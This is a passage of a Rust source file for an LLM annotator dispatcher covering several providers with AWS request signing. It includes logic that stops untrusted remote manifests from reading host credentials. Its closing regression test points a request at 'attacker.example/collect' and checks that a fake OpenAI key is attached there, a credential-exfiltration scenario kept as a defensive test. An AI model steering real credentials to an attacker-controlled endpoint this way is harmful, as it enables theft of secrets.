use crate::dispatchers::{
    bundled::{HttpTransport, TransportRequest, TransportResponse, UreqHttpTransport},
    constants::*,
    http, resolve,
};
use crate::{AnnotatorDispatcher, AnnotatorInvocation, JsonValue, Limits, RuntimeError};
use serde_json::json;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;

#[derive(Debug, Clone, Copy)]
pub struct LlmAnnotator {
    limits: Limits,
    url_sourced: bool,
}

impl Default for LlmAnnotator {
    fn default() -> Self {
        Self::new()
    }
}

impl LlmAnnotator {
    pub fn new() -> Self {
        Self {
            limits: Limits::default(),
            url_sourced: false,
        }
    }

    pub fn with_limits(mut self, limits: Limits) -> Self {
        self.limits = limits;
        self
    }

    /// Mark this dispatcher as serving a URL sourced (untrusted) manifest. When
    /// set, the `llm` credential resolution never falls back to a host
    /// environment variable, including a provider's default credential env var,
    /// so a remote manifest cannot exfiltrate a host secret to the endpoint it
    /// also controls. Credentials must be supplied inline instead.
    pub fn with_url_sourced(mut self, url_sourced: bool) -> Self {
        self.url_sourced = url_sourced;
        self
    }

    pub fn dispatch_with_transport(
        &self,
        annotator_name: &str,
        annotator: &AnnotatorInvocation,
        preliminary_policy_input: &JsonValue,
        transport: &dyn HttpTransport,
    ) -> Result<JsonValue, RuntimeError> {
        dispatch_with_transport(
            annotator_name,
            annotator,
            preliminary_policy_input,
            transport,
            self.limits,
            self.url_sourced,
        )
    }
}

impl AnnotatorDispatcher for LlmAnnotator {
    fn dispatch(
        &self,
        annotator_name: &str,
        annotator: &AnnotatorInvocation,
        preliminary_policy_input: &JsonValue,
    ) -> Result<JsonValue, RuntimeError> {
        dispatch_with_transport(
            annotator_name,
            annotator,
            preliminary_policy_input,
            &UreqHttpTransport,
            self.limits,
            self.url_sourced,
        )
    }
}

fn dispatch_with_transport(
    annotator_name: &str,
    annotator: &AnnotatorInvocation,
    preliminary_policy_input: &JsonValue,
    transport: &dyn HttpTransport,
    limits: Limits,
    url_sourced: bool,
) -> Result<JsonValue, RuntimeError> {
    if annotator.field(ANNOTATOR_TYPE).and_then(JsonValue::as_str) != Some(TYPE_LLM) {
        return Err(resolve::failed(
            annotator_name,
            "LLM dispatcher received a non-LLM annotator",
        ));
    }
    let cfg = LlmConfig::from_fields(annotator_name, &annotator.fields, limits, url_sourced)?;
    let policy_target =
        resolve::policy_target_text(annotator_name, annotator, preliminary_policy_input)?;
    let request = request_for_provider(annotator_name, &cfg, &policy_target)?;
    let response = transport
        .send(request)
        .map_err(|error| resolve::failed(annotator_name, error))?;
    response.ensure_success(annotator_name)?;
    let response_json: JsonValue = serde_json::from_str(&response.body).map_err(|error| {
        resolve::failed(
            annotator_name,
            format!("LLM response was not valid JSON: {error}"),
        )
    })?;
    annotation_from_provider_response(annotator_name, &cfg, response_json)
}

#[derive(Debug, Clone)]
struct LlmConfig {
    provider: LlmProvider,
    endpoint: Option<String>,
    base_url: Option<String>,
    model: String,
    deployment: Option<String>,
    api_version: Option<String>,
    api_key: Option<String>,
    api_key_env: Option<String>,
    api_key_header: Option<String>,
    timeout_ms: u64,
    prompt: String,
    label_field: String,
    headers: BTreeMap<String, String>,
    provider_config: JsonValue,
    aws_region: Option<String>,
    aws_access_key_id: Option<String>,
    aws_access_key_id_env: Option<String>,
    aws_secret_access_key: Option<String>,
    aws_secret_access_key_env: Option<String>,
    aws_session_token: Option<String>,
    aws_session_token_env: Option<String>,
    aws_amz_date: Option<String>,
    aws_date: Option<String>,
    url_sourced: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LlmProvider {
    OpenAi,
    OpenAiCompatible,
    AzureOpenAi,
    Bedrock,
    Gemini,
    Ollama,
}

impl LlmProvider {
    fn parse(value: Option<&str>) -> Result<Self, String> {
        match value.unwrap_or("openai").to_ascii_lowercase().as_str() {
            "openai" => Ok(Self::OpenAi),
            "openai_compatible" | "openai-compatible" | "compatible" => Ok(Self::OpenAiCompatible),
            "azure_openai" | "azure-openai" => Ok(Self::AzureOpenAi),
            "bedrock" | "aws_bedrock" | "aws-bedrock" => Ok(Self::Bedrock),
            "gemini" | "google_gemini" | "google-gemini" => Ok(Self::Gemini),
            "ollama" => Ok(Self::Ollama),
            other => Err(format!("unsupported LLM provider '{other}'")),
        }
    }
}

/// Resolve the system prompt for an LLM annotator from exactly one configured
/// source. Inline `system_prompt` (or its `prompt` alias) wins, then a
/// manifest relative `system_prompt_file` read from disk, then a pinned
/// `system_prompt_url` fetched over the extends trust gate. With no source the
/// preset default is used. The manifest validator already rejects more than
/// one source, so the precedence here only orders the single configured case.
/// Any read or fetch failure fails closed as an annotator error.
fn resolve_system_prompt(
    annotator_name: &str,
    fields: &BTreeMap<String, JsonValue>,
    limits: Limits,
) -> Result<String, RuntimeError> {
    if let Some(text) = http::optional_string_field(fields, FIELD_SYSTEM_PROMPT)
        .or_else(|| http::optional_string_field(fields, FIELD_PROMPT))
    {
        return Ok(text.to_string());
    }
    if let Some(path) = http::optional_string_field(fields, FIELD_SYSTEM_PROMPT_FILE) {
        return std::fs::read_to_string(path).map_err(|error| {
            resolve::failed(
                annotator_name,
                format!("failed to read system_prompt_file '{path}': {error}"),
            )
        });
    }
    if let Some(value) = fields.get(FIELD_SYSTEM_PROMPT_URL) {
        return crate::manifest::fetch_pinned_https_text(value, limits)
            .map_err(|error| resolve::failed(annotator_name, error.detail().to_string()));
    }
    Ok(DEFAULT_SYSTEM_PROMPT.to_string())
}

impl LlmConfig {
    fn from_fields(
        annotator_name: &str,
        fields: &BTreeMap<String, JsonValue>,
        limits: Limits,
        url_sourced: bool,
    ) -> Result<Self, RuntimeError> {
        let provider = LlmProvider::parse(http::optional_string_field(fields, FIELD_PROVIDER))
            .map_err(|error| resolve::failed(annotator_name, error))?;
        let model = http::optional_string_field(fields, FIELD_MODEL)
            .unwrap_or(match provider {
                LlmProvider::Gemini => "gemini-1.5-flash",
                LlmProvider::Ollama => "llama3.1",
                _ => DEFAULT_MODEL,
            })
            .to_string();
        let prompt = resolve_system_prompt(annotator_name, fields, limits)?;
        Ok(Self {
            provider,
            endpoint: opt_string(fields, FIELD_ENDPOINT),
            base_url: opt_string(fields, FIELD_BASE_URL),
            model,
            deployment: opt_string(fields, FIELD_DEPLOYMENT),
            api_version: opt_string(fields, FIELD_API_VERSION),
            api_key: opt_string(fields, FIELD_API_KEY),
            api_key_env: opt_string(fields, FIELD_API_KEY_ENV),
            api_key_header: opt_string(fields, FIELD_API_KEY_HEADER),
            timeout_ms: http::timeout_ms(annotator_name, fields)?,
            prompt,
            label_field: http::optional_string_field(fields, FIELD_LABEL_FIELD)
                .unwrap_or(DEFAULT_LABEL_FIELD)
                .to_string(),
            headers: optional_string_map(annotator_name, fields, FIELD_HEADERS)?,
            provider_config: fields
                .get(FIELD_PROVIDER_CONFIG)
                .cloned()
                .unwrap_or(JsonValue::Null),
            aws_region: opt_string(fields, FIELD_AWS_REGION),
            aws_access_key_id: opt_string(fields, FIELD_AWS_ACCESS_KEY_ID),
            aws_access_key_id_env: opt_string(fields, FIELD_AWS_ACCESS_KEY_ID_ENV),
            aws_secret_access_key: opt_string(fields, FIELD_AWS_SECRET_ACCESS_KEY),
            aws_secret_access_key_env: opt_string(fields, FIELD_AWS_SECRET_ACCESS_KEY_ENV),
            aws_session_token: opt_string(fields, FIELD_AWS_SESSION_TOKEN),
            aws_session_token_env: opt_string(fields, FIELD_AWS_SESSION_TOKEN_ENV),
            aws_amz_date: opt_string(fields, FIELD_AWS_AMZ_DATE),
            aws_date: opt_string(fields, FIELD_AWS_DATE),
            url_sourced,
        })
    }

    fn secret_from_field_or_env(
        &self,
        annotator_name: &str,
        default_env: Option<&str>,
    ) -> Result<Option<String>, RuntimeError> {
        if let Some(value) = &self.api_key {
            return Ok(Some(value.clone()));
        }
        // A URL sourced manifest must not read any host environment credential,
        // neither an explicit `api_key_env` (already rejected at load) nor a
        // provider default env var, because it also controls the egress
        // endpoint. Inline only; absence yields no credential.
        if self.url_sourced {
            return Ok(None);
        }
        let env_name = self.api_key_env.as_deref().or(default_env);
        match env_name {
            Some(env_name) => std::env::var(env_name).map(Some).map_err(|_| {
                resolve::failed(
                    annotator_name,
                    format!("API key environment variable '{env_name}' is not set"),
                )
            }),
            None => Ok(None),
        }
    }
}

trait TransportResponseExt {
    fn ensure_success(&self, annotator_name: &str) -> Result<(), RuntimeError>;
}

impl TransportResponseExt for TransportResponse {
    fn ensure_success(&self, annotator_name: &str) -> Result<(), RuntimeError> {
        if (200..300).contains(&self.status) {
            Ok(())
        } else {
            Err(resolve::failed(
                annotator_name,
                format!(
                    "HTTP request failed with status {}: {}",
                    self.status,
                    self.body.trim()
                ),
            ))
        }
    }
}

fn request_for_provider(
    annotator_name: &str,
    cfg: &LlmConfig,
    policy_target: &str,
) -> Result<TransportRequest, RuntimeError> {
    match cfg.provider {
        LlmProvider::OpenAi => openai_request(annotator_name, cfg, policy_target, true),
        LlmProvider::OpenAiCompatible => openai_request(annotator_name, cfg, policy_target, false),
        LlmProvider::AzureOpenAi => azure_openai_request(annotator_name, cfg, policy_target),
        LlmProvider::Bedrock => bedrock_request(annotator_name, cfg, policy_target),
        LlmProvider::Gemini => gemini_request(annotator_name, cfg, policy_target),
        LlmProvider::Ollama => ollama_request(cfg, policy_target),
    }
}

fn base_request(cfg: &LlmConfig, url: String) -> TransportRequest {
    let mut request = TransportRequest::post(url)
        .header(HEADER_CONTENT_TYPE, CONTENT_TYPE_JSON)
        .header(HEADER_ACCEPT, CONTENT_TYPE_JSON)
        .timeout_ms(cfg.timeout_ms);
    for (name, value) in &cfg.headers {
        request = request.header(name, value);
    }
    request
}

fn openai_request(
    annotator_name: &str,
    cfg: &LlmConfig,
    policy_target: &str,
    require_default_key: bool,
) -> Result<TransportRequest, RuntimeError> {
    let url = cfg
        .endpoint
        .as_deref()
        .or(cfg.base_url.as_deref())
        .unwrap_or(DEFAULT_OPENAI_CHAT_COMPLETIONS_URL)
        .to_string();
    let body = merge_provider_config(
        json!({
            REQUEST_MODEL: cfg.model,
            REQUEST_MESSAGES: [
                { REQUEST_ROLE: ROLE_SYSTEM, REQUEST_CONTENT: cfg.prompt },
                { REQUEST_ROLE: ROLE_USER, REQUEST_CONTENT: policy_target },
            ],
            REQUEST_RESPONSE_FORMAT: { REQUEST_RESPONSE_FORMAT_TYPE: RESPONSE_FORMAT_JSON_OBJECT },
        }),
        &cfg.provider_config,
    );
    let mut request = base_request(cfg, url).json(body);
    let default_env = require_default_key.then_some(DEFAULT_OPENAI_API_KEY_ENV);
    if let Some(api_key) = cfg.secret_from_field_or_env(annotator_name, default_env)? {
        request = request.header(
            cfg.api_key_header
                .as_deref()
                .unwrap_or(HEADER_AUTHORIZATION),
            auth_value(cfg, api_key),
        );
    }
    Ok(request)
}

fn azure_openai_request(
    annotator_name: &str,
    cfg: &LlmConfig,
    policy_target: &str,
) -> Result<TransportRequest, RuntimeError> {
    let url = match cfg.endpoint.as_deref() {
        Some(endpoint) if endpoint.contains("/chat/completions") => endpoint.to_string(),
        Some(endpoint) => {
            let deployment = cfg.deployment.as_deref().ok_or_else(|| {
                resolve::failed(annotator_name, "azure_openai requires 'deployment' when endpoint is not the full chat completions URL")
            })?;
            let api_version = cfg.api_version.as_deref().ok_or_else(|| {
                resolve::failed(annotator_name, "azure_openai requires 'api_version' when endpoint is not the full chat completions URL")
            })?;
            format!(
                "{}/openai/deployments/{}/chat/completions?api-version={}",
                endpoint.trim_end_matches('/'),
                deployment,
                api_version
            )
        }
        None => cfg.base_url.clone().ok_or_else(|| {
            resolve::failed(
                annotator_name,
                "azure_openai requires 'endpoint' or a full 'base_url'",
            )
        })?,
    };
    let api_key = cfg
        .secret_from_field_or_env(annotator_name, Some(DEFAULT_AZURE_OPENAI_API_KEY_ENV))?
        .ok_or_else(|| resolve::failed(annotator_name, "azure_openai requires an API key"))?;
    let body = merge_provider_config(
        json!({
            REQUEST_MESSAGES: [
                { REQUEST_ROLE: ROLE_SYSTEM, REQUEST_CONTENT: cfg.prompt },
                { REQUEST_ROLE: ROLE_USER, REQUEST_CONTENT: policy_target },
            ],
            REQUEST_RESPONSE_FORMAT: { REQUEST_RESPONSE_FORMAT_TYPE: RESPONSE_FORMAT_JSON_OBJECT },
        }),
        &cfg.provider_config,
    );
    Ok(base_request(cfg, url)
        .header(
            cfg.api_key_header.as_deref().unwrap_or(HEADER_API_KEY),
            api_key,
        )
        .json(body))
}

fn gemini_request(
    annotator_name: &str,
    cfg: &LlmConfig,
    policy_target: &str,
) -> Result<TransportRequest, RuntimeError> {
    let api_key = cfg
        .secret_from_field_or_env(annotator_name, Some(DEFAULT_GEMINI_API_KEY_ENV))?
        .ok_or_else(|| resolve::failed(annotator_name, "gemini requires an API key"))?;
    let url = cfg.endpoint.clone().unwrap_or_else(|| {
        format!(
            "https://generativelanguage.googleapis.com/v1beta/models/{}:generateContent",
            cfg.model
        )
    });
    let body = merge_provider_config(
        json!({
            "systemInstruction": { "parts": [{ "text": cfg.prompt }] },
            "contents": [{ "role": "user", "parts": [{ "text": policy_target }] }],
            "generationConfig": { "responseMimeType": "application/json" },
        }),
        &cfg.provider_config,
    );
    Ok(base_request(cfg, url)
        .header(
            cfg.api_key_header.as_deref().unwrap_or("x-goog-api-key"),
            api_key,
        )
        .json(body))
}

fn ollama_request(cfg: &LlmConfig, policy_target: &str) -> Result<TransportRequest, RuntimeError> {
    let url = cfg
        .endpoint
        .clone()
        .or_else(|| {
            cfg.base_url
                .as_ref()
                .map(|base| format!("{}/api/chat", base.trim_end_matches('/')))
        })
        .unwrap_or_else(|| DEFAULT_OLLAMA_CHAT_URL.to_string());
    let body = merge_provider_config(
        json!({
            REQUEST_MODEL: cfg.model,
            REQUEST_MESSAGES: [
                { REQUEST_ROLE: ROLE_SYSTEM, REQUEST_CONTENT: cfg.prompt },
                { REQUEST_ROLE: ROLE_USER, REQUEST_CONTENT: policy_target },
            ],
            "format": "json",
            "stream": false,
        }),
        &cfg.provider_config,
    );
    Ok(base_request(cfg, url).json(body))
}

fn bedrock_request(
    annotator_name: &str,
    cfg: &LlmConfig,
    policy_target: &str,
) -> Result<TransportRequest, RuntimeError> {
    let region = cfg
        .aws_region
        .clone()
        .or_else(|| std::env::var("AWS_REGION").ok())
        .or_else(|| std::env::var("AWS_DEFAULT_REGION").ok())
        .ok_or_else(|| {
            resolve::failed(
                annotator_name,
                "bedrock requires 'aws_region' or AWS_REGION",
            )
        })?;
    let access_key = secret_field_or_env(
        annotator_name,
        cfg.aws_access_key_id.as_deref(),
        cfg.aws_access_key_id_env.as_deref(),
        DEFAULT_AWS_ACCESS_KEY_ID_ENV,
        cfg.url_sourced,
    )?;
    let secret_key = secret_field_or_env(
        annotator_name,
        cfg.aws_secret_access_key.as_deref(),
        cfg.aws_secret_access_key_env.as_deref(),
        DEFAULT_AWS_SECRET_ACCESS_KEY_ENV,
        cfg.url_sourced,
    )?;
    let session_token = cfg.aws_session_token.clone().or_else(|| {
        // A URL sourced manifest never reads a host environment session token,
        // which the bedrock signer would otherwise send verbatim as the
        // x-amz-security-token header to the manifest controlled endpoint.
        if cfg.url_sourced {
            return None;
        }
        let env_name = cfg
            .aws_session_token_env
            .as_deref()
            .unwrap_or(DEFAULT_AWS_SESSION_TOKEN_ENV);
        std::env::var(env_name).ok()
    });
    let model = require_non_empty(annotator_name, FIELD_MODEL, &cfg.model)?;
    let url = cfg.endpoint.clone().unwrap_or_else(|| {
        format!(
            "https://bedrock-runtime.{}.amazonaws.com/model/{}/converse",
            region,
            percent_encode_path_segment(model)
        )
    });
    let body = json!({
        "system": [{ "text": cfg.prompt }],
        "messages": [{ "role": "user", "content": [{ "text": policy_target }] }],
    });
    let body = merge_provider_config(body, &cfg.provider_config);
    let mut request = base_request(cfg, url).json(body);
    sign_bedrock_request(
        annotator_name,
        &mut request,
        BedrockSigning {
            region: &region,
            access_key: &access_key,
            secret_key: &secret_key,
            session_token: session_token.as_deref(),
            amz_date_override: cfg.aws_amz_date.as_deref(),
            date_override: cfg.aws_date.as_deref(),
        },
    )?;
    Ok(request)
}

fn annotation_from_provider_response(
    annotator_name: &str,
    cfg: &LlmConfig,
    response: JsonValue,
) -> Result<JsonValue, RuntimeError> {
    let raw = match cfg.provider {
        LlmProvider::OpenAi | LlmProvider::OpenAiCompatible | LlmProvider::AzureOpenAi => {
            extract_openai_content(&response)
        }
        LlmProvider::Gemini => extract_gemini_content(&response),
        LlmProvider::Ollama => extract_ollama_content(&response),
        LlmProvider::Bedrock => extract_bedrock_content(&response),
    }
    .ok_or_else(|| resolve::failed(annotator_name, "LLM response missing text content"))?;
    annotation_from_json_text(annotator_name, &cfg.label_field, &raw)
}

fn annotation_from_json_text(
    annotator_name: &str,
    label_field: &str,
    raw: &str,
) -> Result<JsonValue, RuntimeError> {
    let parsed: JsonValue = serde_json::from_str(raw).map_err(|error| {
        resolve::failed(
            annotator_name,
            format!("model content was not valid JSON: {error}"),
        )
    })?;
    let label = parsed
        .get(label_field)
        .and_then(JsonValue::as_str)
        .ok_or_else(|| {
            resolve::failed(
                annotator_name,
                format!("model JSON missing string field '{label_field}'"),
            )
        })?;
    Ok(json!({ OUTPUT_LABEL: label, OUTPUT_RAW: raw }))
}

fn extract_openai_content(response: &JsonValue) -> Option<String> {
    let content = response
        .get(RESPONSE_CHOICES)?
        .as_array()?
        .first()?
        .get(RESPONSE_MESSAGE)?
        .get(RESPONSE_CONTENT)?;
    content_text(content)
}

fn extract_gemini_content(response: &JsonValue) -> Option<String> {
    let parts = response
        .get("candidates")?
        .as_array()?
        .first()?
        .get("content")?
        .get("parts")?;
    content_text(parts)
}

fn extract_ollama_content(response: &JsonValue) -> Option<String> {
    response
        .get(RESPONSE_MESSAGE)
        .and_then(|message| message.get(RESPONSE_CONTENT))
        .and_then(content_text)
        .or_else(|| {
            response
                .get("response")
                .and_then(JsonValue::as_str)
                .map(str::to_string)
        })
}

fn extract_bedrock_content(response: &JsonValue) -> Option<String> {
    let content = response
        .get("output")?
        .get(RESPONSE_MESSAGE)?
        .get(RESPONSE_CONTENT)?;
    content_text(content)
}

fn content_text(value: &JsonValue) -> Option<String> {
    if let Some(text) = value.as_str() {
        return Some(text.to_string());
    }
    if let Some(array) = value.as_array() {
        let mut out = String::new();
        for part in array {
            if let Some(text) = part.get("text").and_then(JsonValue::as_str) {
                out.push_str(text);
            }
        }
        return (!out.is_empty()).then_some(out);
    }
    None
}

fn auth_value(cfg: &LlmConfig, api_key: String) -> String {
    if cfg.api_key_header.is_some() {
        api_key
    } else {
        format!("{AUTH_BEARER_PREFIX}{api_key}")
    }
}

fn opt_string(fields: &BTreeMap<String, JsonValue>, name: &str) -> Option<String> {
    http::optional_string_field(fields, name).map(str::to_string)
}

fn optional_string_map(
    annotator_name: &str,
    fields: &BTreeMap<String, JsonValue>,
    name: &str,
) -> Result<BTreeMap<String, String>, RuntimeError> {
    let Some(value) = fields.get(name) else {
        return Ok(BTreeMap::new());
    };
    let object = value.as_object().ok_or_else(|| {
        resolve::failed(annotator_name, format!("field '{name}' must be an object"))
    })?;
    object
        .iter()
        .map(|(key, value)| {
            value
                .as_str()
                .map(|text| (key.clone(), text.to_string()))
                .ok_or_else(|| {
                    resolve::failed(
                        annotator_name,
                        format!("field '{name}.{key}' must be a string"),
                    )
                })
        })
        .collect()
}

fn require_non_empty<'a>(
    annotator_name: &str,
    field: &str,
    value: &'a str,
) -> Result<&'a str, RuntimeError> {
    if value.is_empty() {
        Err(resolve::failed(
            annotator_name,
            format!("missing required field '{field}'"),
        ))
    } else {
        Ok(value)
    }
}

fn secret_field_or_env(
    annotator_name: &str,
    direct: Option<&str>,
    env_name: Option<&str>,
    default_env: &str,
    url_sourced: bool,
) -> Result<String, RuntimeError> {
    if let Some(value) = direct {
        return Ok(value.to_string());
    }
    // A URL sourced manifest is untrusted for host local access, so it must not
    // read an AWS credential from the host environment, neither an explicit
    // `aws_*_env` (already rejected at load) nor the provider default env var.
    // Fail closed so the credential is supplied inline or not at all.
    if url_sourced {
        return Err(resolve::failed(
            annotator_name,
            "a URL sourced manifest must supply this AWS credential inline; host environment credentials are not read for an untrusted remote manifest",
        ));
    }
    let env_name = env_name.unwrap_or(default_env);
    std::env::var(env_name).map_err(|_| {
        resolve::failed(
            annotator_name,
            format!("credential environment variable '{env_name}' is not set"),
        )
    })
}

fn merge_provider_config(mut body: JsonValue, provider_config: &JsonValue) -> JsonValue {
    let Some(extra) = provider_config.as_object() else {
        return body;
    };
    let Some(body_object) = body.as_object_mut() else {
        return body;
    };
    for (key, value) in extra {
        body_object.insert(key.clone(), value.clone());
    }
    body
}

struct BedrockSigning<'a> {
    region: &'a str,
    access_key: &'a str,
    secret_key: &'a str,
    session_token: Option<&'a str>,
    amz_date_override: Option<&'a str>,
    date_override: Option<&'a str>,
}

fn sign_bedrock_request(
    annotator_name: &str,
    request: &mut TransportRequest,
    signing: BedrockSigning<'_>,
) -> Result<(), RuntimeError> {
    let (amz_date, date_stamp) = match (signing.amz_date_override, signing.date_override) {
        (Some(amz_date), Some(date)) => (amz_date.to_string(), date.to_string()),
        _ => aws_dates().map_err(|error| resolve::failed(annotator_name, error))?,
    };
    let (host, canonical_uri, canonical_query) =
        parse_url_for_signing(&request.url).ok_or_else(|| {
            resolve::failed(
                annotator_name,
                "bedrock endpoint must be an absolute HTTP URL",
            )
        })?;
    request.headers.insert("host".to_string(), host);
    request
        .headers
        .insert("x-amz-date".to_string(), amz_date.clone());
    if let Some(session_token) = signing.session_token {
        request.headers.insert(
            "x-amz-security-token".to_string(),
            session_token.to_string(),
        );
    }
    let payload_hash = hex_sha256(&serde_json::to_vec(&request.body).map_err(|error| {
        resolve::failed(
            annotator_name,
            format!("failed to serialize bedrock request: {error}"),
        )
    })?);
    request
        .headers
        .insert("x-amz-content-sha256".to_string(), payload_hash.clone());
    let (canonical_headers, signed_headers) = canonical_sigv4_headers(&request.headers);
    let canonical_request = format!(
        "POST\n{canonical_uri}\n{canonical_query}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
    );
    let credential_scope = format!("{date_stamp}/{}/bedrock/aws4_request", signing.region);
    let string_to_sign = format!(
        "AWS4-HMAC-SHA256\n{amz_date}\n{credential_scope}\n{}",
        hex_sha256(canonical_request.as_bytes())
    );
    let signing_key = aws_signing_key(signing.secret_key, &date_stamp, signing.region, "bedrock");
    let signature = hex(&hmac_sha256(&signing_key, string_to_sign.as_bytes()));
    request.headers.insert(
        HEADER_AUTHORIZATION.to_string(),
        format!(
            "AWS4-HMAC-SHA256 Credential={}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}",
            signing.access_key
        ),
    );
    Ok(())
}

fn parse_url_for_signing(url: &str) -> Option<(String, String, String)> {
    let rest = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))?;
    let (host, path_and_query) = match rest.split_once('/') {
        Some((host, path)) => (host.to_string(), format!("/{path}")),
        None => (rest.to_string(), "/".to_string()),
    };
    let (path, query) = path_and_query
        .split_once('?')
        .map(|(path, query)| (path.to_string(), query.to_string()))
        .unwrap_or((path_and_query, String::new()));
    Some((host, path, query))
}

fn canonical_sigv4_headers(headers: &BTreeMap<String, String>) -> (String, String) {
    let mut normalized: BTreeMap<String, String> = BTreeMap::new();
    for (name, value) in headers {
        let lower = name.to_ascii_lowercase();
        let value = normalize_sigv4_header_value(value);
        normalized
            .entry(lower)
            .and_modify(|existing| {
                existing.push(',');
                existing.push_str(&value);
            })
            .or_insert(value);
    }

    let mut canonical_headers = String::new();
    let mut signed_names = Vec::new();
    for (name, value) in normalized {
        canonical_headers.push_str(&name);
        canonical_headers.push(':');
        canonical_headers.push_str(&value);
        canonical_headers.push('\n');
        signed_names.push(name);
    }
    (canonical_headers, signed_names.join(";"))
}

fn normalize_sigv4_header_value(value: &str) -> String {
    value.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn aws_signing_key(secret_key: &str, date: &str, region: &str, service: &str) -> Vec<u8> {
    let k_date = hmac_sha256(format!("AWS4{secret_key}").as_bytes(), date.as_bytes());
    let k_region = hmac_sha256(&k_date, region.as_bytes());
    let k_service = hmac_sha256(&k_region, service.as_bytes());
    hmac_sha256(&k_service, b"aws4_request")
}

fn hmac_sha256(key: &[u8], message: &[u8]) -> Vec<u8> {
    const BLOCK_SIZE: usize = 64;
    let mut key_block = [0u8; BLOCK_SIZE];
    if key.len() > BLOCK_SIZE {
        let digest = Sha256::digest(key);
        key_block[..digest.len()].copy_from_slice(&digest);
    } else {
        key_block[..key.len()].copy_from_slice(key);
    }
    let mut outer = [0x5cu8; BLOCK_SIZE];
    let mut inner = [0x36u8; BLOCK_SIZE];
    for i in 0..BLOCK_SIZE {
        outer[i] ^= key_block[i];
        inner[i] ^= key_block[i];
    }
    let mut inner_hash = Sha256::new();
    inner_hash.update(inner);
    inner_hash.update(message);
    let inner_result = inner_hash.finalize();
    let mut outer_hash = Sha256::new();
    outer_hash.update(outer);
    outer_hash.update(inner_result);
    outer_hash.finalize().to_vec()
}

fn hex_sha256(bytes: &[u8]) -> String {
    hex(&Sha256::digest(bytes))
}

fn hex(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        out.push(HEX[(byte >> 4) as usize] as char);
        out.push(HEX[(byte & 0x0f) as usize] as char);
    }
    out
}

fn percent_encode_path_segment(value: &str) -> String {
    let mut out = String::new();
    for byte in value.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char)
            }
            _ => out.push_str(&format!("%{byte:02X}")),
        }
    }
    out
}

fn aws_dates() -> Result<(String, String), String> {
    let duration = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_err(|error| format!("system clock is before Unix epoch: {error}"))?;
    let secs = duration.as_secs() as i64;
    let days = secs.div_euclid(86_400);
    let seconds_of_day = secs.rem_euclid(86_400);
    let (year, month, day) = civil_from_days(days);
    let hour = seconds_of_day / 3600;
    let minute = (seconds_of_day % 3600) / 60;
    let second = seconds_of_day % 60;
    Ok((
        format!("{year:04}{month:02}{day:02}T{hour:02}{minute:02}{second:02}Z"),
        format!("{year:04}{month:02}{day:02}"),
    ))
}

fn civil_from_days(days_since_epoch: i64) -> (i64, i64, i64) {
    let z = days_since_epoch + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = mp + if mp < 10 { 3 } else { -9 };
    let year = y + if m <= 2 { 1 } else { 0 };
    (year, m, d)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dispatchers::bundled::StubHttpTransport;
    use serde_json::json;

    fn annotator(pairs: &[(&str, JsonValue)]) -> AnnotatorInvocation {
        let mut fields = BTreeMap::from([
            (ANNOTATOR_TYPE.to_string(), json!(TYPE_LLM)),
            (FIELD_FROM.to_string(), json!("$.input.text")),
        ]);
        for (key, value) in pairs {
            fields.insert((*key).to_string(), value.clone());
        }
        AnnotatorInvocation { fields }
    }

    fn pi() -> JsonValue {
        json!({"snapshot": {"input": {"text": "review this"}}})
    }

    fn dispatch(annotator: AnnotatorInvocation, body: &str) -> (JsonValue, TransportRequest) {
        let transport = StubHttpTransport::with_response(200, body);
        let output = LlmAnnotator::new()
            .dispatch_with_transport("judge", &annotator, &pi(), &transport)
            .expect("dispatch succeeds");
        (output, transport.last_request().expect("request captured"))
    }

    #[test]
    fn openai_default_preserves_chat_completion_shape() {
        std::env::set_var("ACS_OPENAI_TEST_KEY", "test-key");
        let (output, request) = dispatch(
            annotator(&[(FIELD_API_KEY_ENV, json!("ACS_OPENAI_TEST_KEY"))]),
            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
        );

        assert_eq!(output["label"], json!("safe"));
        assert_eq!(request.url, DEFAULT_OPENAI_CHAT_COMPLETIONS_URL);
        assert_eq!(request.headers[HEADER_AUTHORIZATION], "Bearer test-key");
        assert_eq!(
            request.body[REQUEST_RESPONSE_FORMAT][REQUEST_RESPONSE_FORMAT_TYPE],
            json!(RESPONSE_FORMAT_JSON_OBJECT)
        );
    }

    fn try_dispatch_url_sourced(
        annotator: AnnotatorInvocation,
        body: &str,
    ) -> (Result<JsonValue, RuntimeError>, StubHttpTransport) {
        let transport = StubHttpTransport::with_response(200, body);
        let result = LlmAnnotator::new()
            .with_url_sourced(true)
            .dispatch_with_transport("judge", &annotator, &pi(), &transport);
        (result, transport)
    }

    #[test]
    fn url_sourced_llm_does_not_send_default_env_api_key_to_endpoint() {
        // Security regression: a URL sourced manifest controls the `endpoint`
        // but must not cause the bundled `llm` dispatcher to read the provider
        // default credential (OPENAI_API_KEY) and ship it there. A file sourced
        // manifest keeps the historical default-env behavior.
        std::env::set_var("OPENAI_API_KEY", "sk-host-secret-CONFIDENTIAL");
        let attacker = json!("https://attacker.example/collect");
        let body = r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#;

        // File sourced (url_sourced = false): default env is read and attached.
        let (_out, file_request) = dispatch(annotator(&[(FIELD_ENDPOINT, attacker.clone())]), body);
        assert_eq!(file_request.url, "https://attacker.example/collect");
        assert_eq!(
            file_request.headers[HEADER_AUTHORIZATION],
            "Bearer sk-host-secret-CONFIDENTIAL"
        );

        // URL sourced: no host credential is read, so no Authorization header.
        let (result, transport) =
